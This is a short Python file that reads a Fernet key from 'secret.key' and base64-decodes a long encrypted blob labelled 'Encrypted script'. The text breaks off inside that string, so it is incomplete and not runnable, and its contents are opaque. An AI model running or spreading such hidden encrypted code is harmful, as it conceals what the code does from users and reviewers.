import base64
from cryptography.fernet import Fernet
import sys

# Load key
key = open("secret.key", "rb").read()
cipher = Fernet(key)

# Encrypted script
encrypted_data = base64.b64decode("gAAAAABn4qM3dti9jNJ0BU7HbOk3Wm70wc_MqEVKls7NJprA-jpRiI1etTKINvNk5AXJsNVKOI4akc44FaAd6G9gMlpyqZhSgAq8n0htthI_VRPyKPRWPDe0uEr20fuQFrpV2kPcQDOR5MCMHDXTkRq5t2_yzhQwTUK0X7HnF-8ti3680Wvdlq9qokX_gC01jrffXu0AV65fjX1ZW4pOmrIIz5d4AGGwuUwoSvGrhmnGEPhcMgmTHV4xwCRlZyAkxfJzmuj6cuUbdTjuxECLB1ubwhGf3S4FukUnVzDK4eHWsoXBhM99vuBEonUdrqVr9AEBj-WAPisYubTi9v6K7JmzT9MI0YjXwjEi1IztbSTTJiGZedOjt630tM5wzv7Ju3DjrOYqUMTBop-A84wtCQn8QZVEFS9k2lHbursSB0tsu7duDz4pWeT-_Z0oZMPGYFrIjOG2rOIw4epxUD-W5-nioCAy2vnsK3jNl9HqDWvELIyClq-ghPa7zMng_HX4td4SsrcwHzm248Y0AQig5uPbsuVgnY7XskIBw5ZIusiKSL_wDAYfCHm_n7wLsISJJpJ3qOXw_6GgO1odoVuH9onlYt_4SqOPJIJjV_GqYATIQG8jy58dC--1uXI2BvAtyEpjVADbu-ny8mu-L8fj9i9lQHCAaT6vByZJfmwjTvkvydKe4-blNhFcHkdzNw-cGKGxPdMhRChNNwsR87bjSZda-xzseu_Mt1myJ9FrnS8zczBxJsPic9Io7r1rem_I0SvRpP13lVI0pWTPWE8dNXpPKmfZ2o96hR_-LiAiuCq-ZjcfKTsiyf1zYIfbQY5gUE86o4U0KJeFlEkskAgPHE8UiHnuz15Wdqo5lo1qyPWLgvG1GawyQnB9zku5v65ERIWDr2erBZFyZsaAWubU9xeM-35UYliXD0WbsNcZO-33KSGkoeNmNlFWzWGPbw-11eTRoamLoQTOsoWN31Y0mKbzmBe_Ovx2bKWoYnuNsgFsPU4aBgTMZSl62EzEc1Qt2IUc-Q2mGdK8ADXrHfUkQ987DVTtjHcCg0fTyYbnpoM6xACtz1oyX2P6EMsvhDXjioraEx33uWmeGJgeEe1Smcbxj5nArSLFhbqK6VrVj0wA5WlccB9efYJeuABnHyHjm_jKWp-zK6JdHyzI87OqkgMrJxaOb5S4C9lkY6HLy3S4F7Bc9koCDjJ_G73ulOL-oWT7zRCvwKAmQJzoGiShXEi-FSGxHqj8xPKl6EvbTlvJ5qJi5--CoLf5WKRGNAHPFjyxUR_a1VF-C7q96W72C5rLNb11KzB8RhalfFf6ryRceCQgMWHJW6AC-RSQULcNrI17S88VByMbZeX3y5NeUQ8IsMopKqcFaEPBqY7TLBdCgEBmzs4SA28CcuWoWf_hXRUM_KaZmsSgAmNli1yeyAjNAy95cnK8ca5NWUPL9IGZMwBGjmEYsZ7j11u3fuoqd4EKZeeQBgOENY3d0Ngomon1Lc3-f6eKY-R_tvrXQIGCLypyw9AE1dPeemtutwd_xCTvFDiLOxUf-1rXF-QyWO-aMyTOdbN481pjmf-Vg_EBlwpw2KP0rkqpzaJlxFlN5r2j4wGADNRt0ikiP3uLtGKKTiDnEfOZQG6fAXViaQZXoNJ3L2dQqeMBw2MZTp2cR4lKRgeTnLEjUEkNQG8jUUxUC3gQnCrt26JtttEnctfzB6v9v9SzoPLCp32HI-79n8sq-8OJW2X3pXM9NsI5IxqfUQ7QXEzGCxI4JtY5KAR5uC-92SFx93C8uHqJtRFEVwmRVqSBE-NsMi08ELnV1wf5y-vNa6a5MdxCPSWraKZ_5n9n9EHFHRTGUlOPVKKbORjrmlm_CQKRBVTWqmZLTn9d943ShLuLD6owtcD3kdNvnhV4oLZygfuQuoJ3w-r7VuyFDxzleJkT_E4iuDkw5b618xsRhYK1EoicufYPK_-jfY_-knqt_wIHyoSoaH2DXyT4J3MqiUoStHqvrqdIg3WE4IuLuTfXvEZ1agj7Z1NM_qwuGgE0WYjp8n5JzBp1liDA3zuo90Ilmy8Nz2Ygj7Vpbv9dYYivSi4RgR3iPd_clMn7WxzHLTLvJrzkh3OmLkwMu_DCNQJ_p5uu_bTUJUuHEVdygefifnKFB3wXa5B1YC5N3amxT_-uh6iX-QB7fNVxcxhAHb9XkacSV8nBc0DqZ_jgysz6Mj9m4PPt6BxBqeLi6DianPnndfsq_IvXfghcsitjZWSYm_u9XvKbq9M7EHGx5JPr9dHN_LvVTkJcJxRT-_Dpcj535cY_L2A8BruByvzJaj1l9z__GHLvyOKCMGybOhoM72RtfkUbJqjJW9z-Tm6vHhtj1vCxC9wq6LXldFGFTCMJtpOc5uSOG0YqJtT3F64s_HMvRnJFreaLfmF7O1Hqyfx6Z9jQ77GBmew3j3pXY31MXAXQ2Z4oT9E5M6kX5BIe2rTOKZ18OtUaosPhZh--vHwYrd4h41LbjpxP_MEFKyVk5HH_iEcsQDeZvQdUhfeLNRKBWCWZ1pOdaO8mJIghMCDooec3feOyaYbEKMOy50wulPnchfL4yQuiOgRRfPKHtLUBrqFXzdZACeT93-xAVUreyNE_tHYLfmy8REprAAS5kBllz_9E9Z3znDUfNUsO3-LjpLbv05h2XL55N4rSDb1Ts8DOqxr27eRDcWONH1MdG5IS4YG1m800yT6zeLttbPhDR5iiFssINAjSRWoc-R_dWbYmc-0GCjbtX583cEkFvhMu4a6J0m_KbwAP0YCtyiCBMicmiojEc3VrcTdObb5vxkFMVFmbvcBqT15jchlYgAbmbD2VY8hhVM-9yTRYxSwwOvl87mI8iiJCP3vLZ2aYFvaz9fTGoz3gwd7c1nmTVGMET5M1XjtiNPgCmBxl1_AbdZNnD5jdAgv9Mfn7QHtA8DsMCDTdiQ1isVHhFmPCte7CnyyaybdSSfSMWK3fkQsKOV8JAhAN2A1hE4liyCKYJ3hC36Wu-HSMCSQAVgFxjT5ef366bf8S_JTG7ZMF0iK1GMouFpud9j1WfZEHf5oKbTZtRk_eO0O7VVSJb_QmqCpzr7OJm2j3ApuH2D_EvGAJsXf07i91J96tykp9O87UGpahXdeFP1-6ntwOXjE0HpOEJ5u-8I1HYZBXCzKxti75sJS0NC2ksLfC4X1YgPoZtzg9lBf0vXlNqfE9g2NtkGhnumrB-xz-Jo335Pk-CxYIcSGkajwo37WpwKKYsKxSgLFEXnT1PopILL6BN1e0tXx-JfdfvQMWjwUwr2l3lCm2SI_8O5BO7xBwSKXXgNvmpuo7CrX5M1grr89P6puf2mWxoVwgYm1k55hTJSaRa7XxgCOnPb_oWWdtbG6nb9zgmVI-QH3fOZ8IEouvPXDvIC0TzWwcgoaTjJPhbsqzpTbzJnMKKmjvSaZc0xJOcZpOQfB-RH3ZDGD9nE4vPdajCB5N8mIx7uJMy_0lXrbUpnmYGzbvh1eA9Yt1nLOUkitZ0CRNCBOFz02QiYyjxFs642oWTTC23PT0WvjSzu0NGPzqp4lhqECMSCtml_UdStCQGW8cuXpSWi1vO2NR56ifHIVbpAXHoMU8YIG7zsqOapFhVUSbv7Gb-HVaEOFPixIiqjKj5WuZyQ4YjbpAZeYLzQtDWOLny3vmbnUN8JxiK-Wmz_lvV2LcAqpiTU7vaiBeBkqJtNYQPkBoLHFKvTksWaFDEsXTxC10NPf4hL91sCb8quRI6TIk6KHCqn5K7aO4CeFIUZyVE4mjpdjp-LoTBckVMoNdtoQef51XYg-FVt36RfF6IWmyTwOpInGqpGtnpRQb1GQXFyqYQ_ZO6_6kwfcpbBR3pvSgmKzfJ9WTlAbjW4LUAslarpd-1OXtPpmtwwmoFisSEm8LiSi4UoidGfqUnR0idKEWEb7Tyl1hohUAI3c8qVK-0Z_Q_maYkNRjsFHYtS4sG6IJDxb2Dx6Wk_OvI5X2l-PQtU3g3TBB961uHeA_i7lAR3SN01636wXYKluab3WuATEOmRr7lUJhaPL9gg5cbF3G3a0rnAFrOmINwStXKhoKTIthKxDTQ78uey9BMYEBVT1VBU5giDTdzSsryS4Fzfjh8--UK3DkphVsW2I4orBKXUcHc8kUnfhXQfLgEZhYa0YtYMYPqcYLVnHR6l5OCDuo_DnjAEzTpkeq_ZL2vWmAS2Hk5ZJt-SfMOcUVaj5vCV4IXvvVFOGl7UPTtlOTC_kwpHPgUHSIDxxpZFUNXrmOpZ1V3UvikWY4x_rtrwpIMgk8zQvZ2krzv5WI4yoX5eru7XRvAXr1ME4Z1qa_JqOcv5eT0Rpi4ewqsWtqw-Cc5ThZ_n70zNjPSc8PLNuf3ZHGuZqNK0C199foH-PXfdhgNt6x308JskjQCivNqtdQBH3fjuV4YPT998wQdTxvds1Pfh_g3lJ3RQCaMSNdFa2IpPimfeq_lyMspH5Epa478wXOkKmNJFkNb8F-pkSgNH7PJPMaWwniRcU9dYSWiHsTJQ1F2rOZhoVCp-537I1Kg4SDeHPydGI_B7AFL1camllk7VbuGqV8_Yv8H_Fq3LDlMUoOWizrMpzYeHRIGJxQB6rIuk3p1AHfd1tqPlAc2ouMZLczfR1kGaHSHMKHfpj6WuMg0I9sDyzcR4VaB-mP0Jd7psrCoz7xuUCKXu96kxa4k74aHP0-6-rtmdx8oAAFrEzI1a9JY_syWdAltNwyB01A0ZRz16FybbL3DdmUYcP8zjDY6EtPDwSLN4m3d7iLcJ_uvKv6R2GkVIGI4slnJcdsb5ECZKeBkW2DTaTH92v37TA1sMZXntiHosUAOwpCdc2WgHCm3PxKM82xLzkksc9mXsDKgwp9VhPAyqrnWKEdzhfTDi-nnkloQuqgRbcqAareQafa1Opfl-ipPF7LEtGkHu2C6Zx7qqUbXT2AsT6GFRL3_obR8sfGe2QAoV9Q1dSiscD0bVCN_B9VkM_aRgBgZ33QW1fP0abC29D8X_f_9YG5wd8W5jXAznx5x8P7OLWxegidIdlUhUk6w1tu-3Xfu-acdy4RjU9-9fEBb6zBxx1tVFtL2nq7Ex1nda7mJ_X3ibHxo_7XLv35v5ebT21sAf1R6vlLvmIdAOAM7K1imuiqj3aZ9kkM-GXMyMV7momPZ0T7GAk5Yas7tqakUjFFIV4bBmlsdBs9M3JGZ8KUOCmpZo9LetBy2lDKEtDdCwo29S4-TFBLYYCGK8raM7SsWQgQjjNskCNKZeLjHsy0ssNm1fdlMbLbkw25cEKdZPB4UJBUyo3PZbouVyOk0v4rMO3f7CFYVCt2G_yig6gZ3QPO_GhxQY-bMc8cb_esFjgD8Jrqf4guLFE8VvldpcDAs77Jlj9eq3tpeW1mQsIgo1oj5pTGlURppyzfG92gUA1sCpAHtEAr2e6vpdNd9kVGpI6CzQBL2lc4Ei9DzN014uCtvaI92q2C_WOeBSWUVcPnlflY6xq-_2kawzuwLvPja-HJ20VZne7ICxvAGOJgc9Bh1hLkHJdtcUsePjlaAm1e-U5V9YQMDQ_N-ntF5LCWa4rBnWYldo3NPtSFrd1-uhCFWFMNkqQT2qEZ7xd5Sic6f6hsokiM0L0u4IQbzu3TPikciUmsjTCPVSoQBHcs4vT-ZRTz-5edDxU_Li1Uf12kRKffSXOMSPbKKDMHZfgYchr4Si_yTjQbizmiQ4-3KuPgoGiUg3lWkMBsE4qTFLBwv8S9_ABLJ1f1gLtEJgBRXnb2U3gUCjp8DfTMnIKGoKdPPIqIqDifZcnuTzszcfDCiCtaA11Ga1yurkiaPnnNJZ8d-k8_pDVAYbZ8XF2KAMyk2mMfD_kmkFWDw24KOGddmZMstfFGLzEsM9G-spqx68JZSf08Ce9h8IeVwlC8FsK30vJwlczwBLrAZIB7eL_R4pCVC4qw4OBJovKKJoXWqX8klqOmvZwE2Q1W4XBKhMebuMFm7qGNJA895M_22-yoyH-k_oikwnsL7dMJhwc_g_gh-gdotHNGQBBynVSY2J_7ZVi4u2cLZLQKc8CjXgeBw2RWiPSe1idwF8Zdz8x55aPK4rcGqqvI6YhtILMuX-jAGn6tUN-3TDKEiXMNDxHP2hofh8VwIo6Jk3S9SIgp5MoPtCY2uuSnRjbR488m3zI6Zvy3HKpGjQwFpZHeMzNH_Ek-E08UD5RHgdPUghXA8OutxJrho7HP85boaUgyQEjqdoSRJTi5ubOZl9-6DS5V84Gsfa-ZmUuoCPnZd-ZVqSpgCapdj0VxQhn9mPbx7nUqRnjeHotOOIQ_WvzvdbTVMBS6NeWPs8Nw1wT1fPN7sY0AdrOFvPMXp5YHULIf0eNH4fODPAS9VctacM5Y0EjhPIDS8n9RG149cScnThR81ouETAOMahOipHJDUXogLNKfCTC7ANqhC8L7jntCqTuu2JexLw6NPBoXUs2HSZeIn5sOjqq3t0Ao2HQ7BqX6PJX2dRsuHAU7ZVbNXozoM_vxH0hxJo-dxiYR2L5DgTNQodC1y4hFNEmgh-FGvVo1ZYQYIoW-MmMQbLQrNlVyHh6uZYrsPQ0nq_T9u9-OuiHcyEDjPhzWWeaKitreKiPZtg-mmlRLKt4T7pWkBvJi_jpmlPkYh-K1XE1w7mOa_F8aKY7a_WGVi8cXoMjjv_rJPEtNHgECrcCIusgeze_3fZybCov12LGq9BKQcuaJFAifUnnaL9_8IFduThqdeAwFKiQWIgXr5K7PGxSxESevmQ31-0VRhliOad9bZvGQc4koZzKvJplebWpn_MOAPtlnan3Z9nyRYNPh_xcmAPhQxbxrVBCrBdgwKklDQCr7Q3NnRXuObJB03urCfy_uzMoZku-q3_JhBO1ZB9Wb01m3XnRHl3lApLemWO9ZVffTTCD4NZMHa5_IErjYnWhPI72Vowt4_S0ADh1b7M39Fvg1LgTUIJa7HVWHbono8Cwhd2BaHXxq_zfSCGpC0jsDk5KmkxYleYz7Ud2U9iRMb3Ah2ZugkXJwdAh5ICofOqYYOdXwBaVpSkjKVQkqpVhByJSdMXUkvcrS2mo78qk3oJ9uO6ASAEnzQeEPPVt7wtRDg6dU_tc_mHbd4ydPLlIqAIcZh419gNoBNIoCKG_hCyITF4a983H8bsiC5AHl1eUdu3QGquUnN2vXbQKDHgLRx9K7-ncmBRuRhzRpYEpqhiTHzPofISDtIkBvsQN4e9QbG2_ZO6bzJkYbl__nsS4zU3tmiNUfhpzpqI4E1Qg2jpgBng64nVLHfhyM6XppfW0-Ag8o7n5vJd5F1FGS8FhlcqJ0dwtTP03_AcSN9WwpSaQvRqTbqEj4rp6PTCGyLToWC7D6JJcjpe-7y5apyKiCTS3aaN_KKwowjW_tokmpwrpr63iYpxNED3pWtvQ17jPfJH5nHMUkmp1Zm_yHppt9wv_jteTOk2Av-ARqnhr2hrNLZIhiiV7rRWca53VrT6XiNgsVE-8e87C6agObqBHOMdCKiEG22zKx6UMAbeF6jUUccXf_Js3m3006y-7sbKwg_Ix3uIcBR4oahb1A9Zn0neDV8dWeNk-M20VfMFxHxbc17WYmGpkOfysczcxoz4BBKpmpuApT32NCYGZVCx41K323BjwegxnFejp3BkATgYy0wHXOtafp-Aspw0ELxNAm-BxLDq6xMNEedFA9KnIdPDzw5zrnA9-zjTiVnjNoQ_4_hsky-4x8EvQjDcHOW8ak0ukwVbIpvJzmGajqkpb0B1OJlxeMzVyqDVENT4uT-pFhVsYJv34Hp71ajQy5neJ9so1VuhRQqujEeE6WJoDUsILAp1eVdF4bQAq8L_C2EvUHRidGjcJKlsxTHOuSeVdBmwgGzqGD4eEfzzWhgmUVnA23mbxp6DAPWOzxcRBY-g0lAogNvv3KU-oMawls1qDTyFHmZ7qllxchU0BzQbHWRjzock0LI-t6nK70VuRPH2UtBPhY55jUM4D6abHIA_wedRz3PxDEKKsULSH6VyQAhaND7Z2B6zJUcELVKMGxS_nv2TVm8-Ob8xiy_MkqUNxZqW6MxqzpuoV9TksZt5ePFsde8cKBXmrhRXCAoxKTUIMOCawFUGIjYTr2xkbQADlE1n5Ln0y1lfW5ZsMR82EOQuKNKV9pKWDwyGXolw7eiSSFCoP0sYeSvi3-0g0G6BoODv0dcH6sbOw353QWn1MeaYJVjFDheslJBjBUpnuLz_D48crf9fAYesnJZIfL0RaKlZJfWaVTJnvD4qmikr9190yaRDTUL4ILdAMdG23F1nfcY6i-0ZWTbgQY0or791a1wovG-lq7oxrwjxMqUoE7pEAZHC-XsnMJoVTTuZw_8DNpi5Mv_lDU1-ecJg7ksKXxZbmOaRqZ_FJaDy7354fUDmvMUIiGDZUSlNeaJe1FfNie2eGFXIJgPxvXp-nGK_0BwjWd-FDuAWg0PdY4ibXTBPINzu2yfpUzFX1ix3myxYshiqDdB4ebCTGc_D0_euUgmMMbYn9JMSYvhQaX2B2rCDoU_CPFLsyJyBSN2RUoZUN62VSnQB8QbatDmphV3yT_yvts4kZALBssYLUYDicIiOwnV3UWglPE4amKdHdVfGtKLdLv9L4SDJwhVPQKQjNkyYg70LF765ZvYQylOv50PM4HnA8L6CQjrrrZJ_b5cUwPtST9KpbcDHaEzvDUsIQHt35q70MKgSbNliFOba3DozMdWJpe0LHyqPCKWOIzsiRnxYJZ_aLgz_R1qmLIxzFwhHSfAVhCK-F_nNmhOQwOyKUpEMbnJvId7V1KuHG7kMUSlvlNz1nFgoY5Mq9PsHQQqURFGYSZblPcaJk_4n6lKkfDGeqUuPtH3wNimQf4L5msVfH5zh7pZcwrgdgNaNCViyLqyK5dGo1cp8A7OWfWRHDJQ4nfoAbh9Z-mdpJvuQVuoc5Rp-4jpSIhO6Vg22Dn3cbFRhdn1jfrPQvb6aO3VO6UADErTweNAlHjsvgcf0NBtoNFlTzGz7-i-ZCR20uzQyGS0bJZBeM9OIWm2b2rW1ebSQ17ZGYdBroZe5iPVC18B92CryEwJV_JSiTSfE71Gto-oi4wriOVlSaxOkbbTwhPkG3MOP-4CIWGwDYmlaBXLU1icr_ijLtcGcpvQ8ZhRJV4I0Khi8Vi7UF-1ismj_8cdZs5DcE4bF2YZsnsN53Bpd1XKS4kQvE4ADxDZuGxOsipH-DsMCJx_k6-cp-A1EUwTbA_9O6C8ZmiBMn0HUk_usYJxUWsIHjhk_a6mNayH3rMYF9uXOuoIWYw6M4Zp5UU2THIEpHKZWMkdJuKKWzgFxXt6wLjyZLp4LwpZAigrfw9Zw12Orqb71LPpgPhdz_n-c67O_Zk4wlBauZaNOsou7BKYjN9YiEShs5omKgV18P7qKKGBrVl02tW8MvbczHPS_Cf20DYvSK1c1j9ffIhZzm0nGukBaSIPPCf2a5dmQPb8yv3a2f766vl_9eQIWbWGXRtbzo1-kw8TIoFGdlK3_7ruhowqId_OOXGrowUUxOQjPh4w_oaysyOCGZZX14JvaX492LXJvQ2SE4JMHYNcbrWXhkTS7PJR76_S1Q7UUQr338MxjUb6csYkFAgabqxijOsPqmosXmCCZ6-6t7U5R5XuoxIc8UMnSdLLBzBSMPVnZKTX6grg4ScmeOSBpRBaytNXq1WmkADT_yh1crDTAvsRpppJIfpuTMxUYkr3EXn48ZDnf_cDQjEGek-CsfUvaGuzQKNCtScB2EjCbIisMqltV64gTPAH3_Ybcnt3R0FD-7JAPqk3G0k87B8zsvxW7FGGyNoUeroRfEmffWdXsESEbAKkJNaQ2IcGDPoI4upDt-hJ03l6tMe8E3JHiqvyIx5Kji30mwJ_cSVuCIdGnIiFQBLWItQ247Jd-XhefsNkrXm9eGPfABcoGpeGdQkABNzrh_0hqfrNnDk_ysd49kYcOfaTd_iMe0MBGNUSDlaySCWYn5QLKML4U_kYmH82UifMtVGlbyaGJVYMm3vj15YLcMi0X66cnlRSJXheRd_z60VxcjINNV6ova-aUHuVHtlkG_GSDyW6U6fIRyj2Kl_SNu8GtxKsSY1vACIyRH6at8gFLowVGUhw2ltrnf11r8gHFdAzyZ9zlEGkUXVmWum4pZcXgWlZeXiUEL25sBGVhdhTIsnUrIv0KM_KG5CZ19pclUC9uQlfVrQfnc3CCdTv4_2HPcbvOIla_pJ5jYx6BjAwXOd2CnRNsROUWyyhLkXC95sBMHISjPwfzntx71zKqfbAPSXVx9jEg_DdmiApJv4fRFup-TqWmcCgD3F7Z6o9M6oBUlZZfdE98fYvGb6wYSlQ0E7zd70pVlk7P0C1q2UssE9s3h-3p__YWLxZUZbWhPDXl__lemmhfQb8OivUi9MhZ6xv9LSg1MOfaCimWlct0kTrSZ90h-Nuj2O3g2PY3Q2QR0aCe_nxJJzz1uUdVSyMTlTwJkSqRJZRlTMTPJ9Dhp5y_JedzGKJdaU_zBFdhd-gmrRQtMFTwUzcu8Y-Sr-KdrXVk4tWPptP5GJ5ygTSPCsL3Wimiho54cv-RKzlLo9JZJrsD1SOj9Mkc7iV2rupubNMYUEevq-Edypnrzb2ojKJ7hkwAICTDMbhvTO0aIXEgn87_PU8w3V1v4UfeTDYP7d7y7nfjUWO9wjGrU2k8NGGJgKUvX7CTqD0GDCfw0vTzuQ0-eOQgFw-7kcBJwwJrHxyHOzQ5tLbyB0xhLHV0okBBtRjfP4ksEb1UlQHZOQU5tfQNK-27Gf0gCPS2LG2of_muiPe7YhO9nAiiNV2nnKYhS2oTvLydQeuGgiVd-dsMJ6HY2HCg6C7WCjsakIEIaRtRIoL9oAZzPvGOLHeVDkoHCYHFywN7gplS4aey2QP9V6hh0WcEOUBPysWlY8X9DOGnqracM4cf0KhNvRWZBDhohhn0AUV14lSsfHQ-zw4j4FB0XPT_B3brOk4xIPRptypKkC3kTKXFqAtpoHwKUbNH_YVilUMDQ3ZvwHR0gOr7M9qwFZB4z73bP0KL2vliQGE5M8p7RGchUhHLXIEZY5pXLZlfIVkA71tS6kRP_zqpj1RWQaf-DRnhmN-cuPnFZKo0CbqysUPwaN0aXHyS0YhLpAyn9Y36xSk9VHUUbgtdCbDVbH7TKpKCtr9vPeNKyt-s6fBjFrvCWRivEGsWqjxeH1JYF7LuOxOaPNw22ybWNBDTPLCrZ1MG6Ihc-yi0eg58XVdVc_-EGZQKp_DBjEPInsdj-njpYFMTjdcu2zEPssrcT9R1ksf0-pwhSkxQPXHe330AwZHoawBn2gXbgKLoOwfY3dOgSRIofNI74ViXJKwcI6Gj0wN9CO14jV8hf3_PJATYkV1aAg2n7XVl9f6lGsS9TN5Q3fGFiUr_q_JADAJScaYgjF8T1MzzV2mAfw95BIeZetQnJP6iCQvIrBKVPW-HekT4N_TST1Brp__HFb9e10JLTgsT_0vySHed2tr4BrEIIRFXmWZrlW32DAY5yNytiP9cV2IhCK88PrLH5vo1BEQuQxz_i-MqSQkVZYCKBY2iexsA4GqCzG9Yu4I1PK9NqCYFhlby1sh_hLTmoc8_VnF6aSQLuvNWmOneioO44_ovdnNdW34z4rbbrR9lD6pbIvUKHjyXDad8IK2xDEjPcf8FVck_aF06za48-iYpyLKENYo6KaC0SjcsIeJiT9D3eRCvYe2CgynWbUJSWAdoPfzzY6h4H42fqTDFKVqnEcv2w8GT7oxGdBLz4YFrsZP11_FieALP0VBg_LlK35bZiTyx36KAAsNtmsoVTIczc-KgTP_gwiIWoWrTsvv_mmObU_MlvDXn2IejNubzrYv4G4Y-qdjDDzIkpMfkwJD8ajTmeIfslXSE-CmUXBHXbQFh3PGmf_vK7_ES8barg5_L5e9fltysEf_lpoYtwMXSWKhOVvXUxoug81wmeUsz788kvGSNx69ynN83GKxUv_0OK50P9v3fpYhXJeTp9QzyDNEdL-iQdfXd9A8B103zGCj268MQrPnouA8qHsA52p-D_3gW5uwjSKKuW8z_Qi5LcYp_5oygVyVALYpJsgEnWNZZa_tAKQ6Zl61gKmKfBe-EUFuoFFOnGR0vPEYsGu28EHhKMsBsLCRJub46uL_ygNe-GVvMv4oEHeVEJ2eWG5QM-ICY5Yby43roSznEJHKAqE8V6Vnk1P4x7U2FOMHJ-iHMuDLUhzeJznIc2lV7NzrN4KNO_QV7mUaZsEfFIY0EPrv2BbsyCW4i2wjpHeUkgxFGa6spe68Tq9lfq9ve5aaZRJExFv1lUN9eX-9gR-ngl6CkrLg9APCPB56fBYrphcHNN5esb_ko8Tb8iXxHYUoCq7v4eET7vBwW8op02I42PRjeYC3BvuBsCaVq-ENieZQakuCXf3KNV3MvrJPohbUb4NxGRvVjHNNPz_NTy0R9vSrzDwC2CzMtoxqvdeu1J1vGEzpJGx6HyuiQRAEGQkL3DFXIrnV5Erwln0Nsy1phdeMob1DPGQS7DUqEqtxbdARD9R326yknT27V30dGN-9uoznwwpVcMk2GvzSPu0Gqr4w8o4hyfiDOu1McEHgYNuCZBt7R8e5krA1R1eTDubUxOI3wY9D3T2-R-g6c5FRgugUJCIY2qtUJvHBreg4Il4QDoxjQpU8MHX0oewQE5gq7GnW44IUld8CsnaEV6iu4L4umaHXGCX_GwjkPI-GnCD1IXE34JmZBiBQYaPsYTLyosDn1Va0GfctWtrHQJk31e28Y9jsQLywLzPPR14mPKqKmUS36MbcxUZvEPjEJUhwX-MbMexNH71kbJ4U9l89YLpOHtZVoFGoYjFkW2BJCknchyG7x5eo-xi8ncDknlfRT_W-EqYHrMU_pDLoPFBmg6BvXhspm4Kl8MJRiFp19jHoXovXeI-Yi5ifB3vSd_zideh2KocEL6VIobXzEQrIVLXWmue_lLsx2az-HfeUFuTZz7tTHgoGXNkGRrQhW1zBPMDeMYZPcw8LlOPWojVnB51CzVEE-MQz75FyKuO097mU57iRg23L_zRxen3x_u-NSaSWaITzIme-1rW7xcsVMTC2-Okb-StWtKmWHW3FsjWj84fhJMYm-m7sHnBOl6vj8mDY8BJCCEEpj-BQC_7xDxtkt2eVhHNU_i8tnnX2WQopDrnyYAmx_B4KQVHzBBY2fBD9It0BlryEWIxwnbxzFys15r-cgKxsAq7A2TeHm_-Aoa9brYOlPPTPwWHkX5OzjiMyN8IBl6D9L1ybIUutE2aGfoMtmj20L-A6N4ldis_lPfqlmNgyZUMrWbIo2gaJakMx0uycBtHRr-VBJmT-zXJw7V5pEAv1peq5YTAJIInnYPW9lIJH0wgFP0F4_LL7UCRTRlMuSA8UOc6M6AX8hsnkyDU3AQKOCOe4hYsq4ASbDkysX8GBLnizn1s7lswx8NaWq5rTlj6A-mQpyTmauv3tsH12R-Kla8VMM7VltNRfWVbzi57ELK_XSlVChXbYfKrqGlfloF7kAXtgFKKrZUtVb2vEYORoOZbBZgek2vkYfDpwfg1DtOLQ-PR9Xh4zf_5y0bZlZ_kgujNmF9hgSibTMCuuG7-XZpo7wBwQmc3LdORqq3viuMFeETKJyliJkI2ogxhCtDurX4WMzTt6VEzq3Xc3hlhhkoXzOpxj2at48k2cVkx5-Lf8INqXrYWex6gxY94Tz2KWi4NyWbyCTJNiqJPJ5dDLD6_X5gJtkh9my0Fw7Ea5MdMGiIVzPumqeVjfznl43G6O6nV1158SgSp614CZ59zExWF590WziM9Ko9rxuKyK6fo-iLdb_5sk0sy_F7rgj9edNqrCqGQWZzOKjq9lb69ScnI5cUr4nOxaclD_2Sso88-Mk1nhh4XIXeXw133bHmucfNq5p7_CSLBYJF_R2Ykecfa0_ITUnIXVhv865-TwBZZ9xZWHgtrGKJSBqIh-vUwctT6E0BH5bYo7-tmRuEOa4F_oNGwdLOOIj-Uyh7U1Cg9rgQMjSrmg0zOuiyxgPWi8osrcpzsLKiC_AoarrWuzdjG87plW3QaVQH36U6IZ2Tq_-Vx_lntpEyTBINT7PIqUnLgaDKoqgNS-iEeHup7Mkjlow-Gzh9_AZTRAxDTrrJGXAvCYBfKwZ1E0qfoRB6FA6FOj59PJ9iSUuL1KEIfpd7MTi9T0tSA8T6RWg4ibqQUZE-7iXN8Q3oWovCNN-o1Ocy_aEXdU5eeEBe-8AqmplT_Pa18hxAGw327QcNIlaGTQiZYLcfzZqJ0UXtbrIIY1vnWExACIhm2TB6sG6S_sJKqxkreGzVMVTg1XeDFRMSeT5qPCNG5N0dPws3dfM3xW6Xli8XJ0Bo31oBuzvEz14BGnSVYzWum0hXFQQ2m9_kZ4GrS3S2nX_qsLgWvjKDgbGhqwRLQEsuHmza_vJEmaZgV6Tlp_685zcSO_YDluwF0ChxJOfZmjYF_8oA4H1EBsBpkPGtdNZu_Jeoq2gZ8K4rBF2u0FA8JDmvC2NqKcmLkTckQnSMfsLuerK_K883kD0eCeLfmSZVL-2RVVoo_Lc9Zh_xZmuY2Ss5Xuh843BJEEiGN4p3VjWlPSPW70wnnsdB6GKNxYCUkmd6zKHsJZXwyz0t3b2gymj4pzlGg4K1IOweVFcBfhT9Wao5bVHtsY0WZOI051Ne018Oi0Oj3x5mqg3sYOXXEMjAMzHurRWPcT7nsGXPHdCxNdD9fFegCu_sxg5X0F2mUy3NQ4d1_78Lja2vt7CjG4r_YKFFOHzEmrkoVfgPQrMfbdnugOSKnANQgN5JYEy1GqwmjMRRhWJY3J_O4xM2TZQV0WQYIDSMSfBLe7Kav1nuzRfhbCdBObZRYM5SOCCyvVXpYy1JQAVMGFrVvaQhSdfUSk0pqyzzMv3jQnWV7BxVOsGxFhAOxBEgFdPnkT9X1XmIwzGQms8phhxdShUerUTjCTvLtQOtyttmcpe_mJ_XPJfUyHKO65qtnGUIRdHV870G-7ZBziO9VG9ZPjQXki4RMnAzgtNBNcmElQe8Oo28gd9xUIOFIxFnxU917z6UnHJHVioB2THvqMZRnDflLUlB6pfpq7HaYEoL1SYqS4aci9gfmK7v42eZsiVEQuLDLUxUWaIn4REi0IgwyIx3Ge_nyYw5QMctWJyno9fTLBeJMiAhecZ2Jcub5IR8e-cFelewblLxSp1Ifa1J6N6XpUWwfFhHvIQiHl_kfAYuBYDKqhZhSqhNYfDuXXCsJLxKQsZBS3mQ3TWXcFaCST2xyn3DziSTdIagfIRbKUkQWY0oS2gQeYY1UzhRBHaO2N-VBRStvQf191ij0r5RAvcaFwBuOqFaU63zCUT7B3PJJjUnkXNyeMMu1elkMLUxWsvsEi4OwEpflwAa6pnijYD3hCb9d7Om-MooaOkrXP62X7c7KceUoZ3bdh2uIFEsQ9yC3PpDrfXsRFp7EmP-OUFdLKOfHCtSHzN7vo1UrK6y9AkFyjWejgML1GVkYChLUIlrdT3guM4bhw5gvZWUR-XizVuI17DREBIZ7htbYy8D1LNAOxdmansNG9lNGr6ujV5aztr1HzEID5dYdQs6p23lLaj6VnjlAkZQhpAey3CZDl-T3LZpH2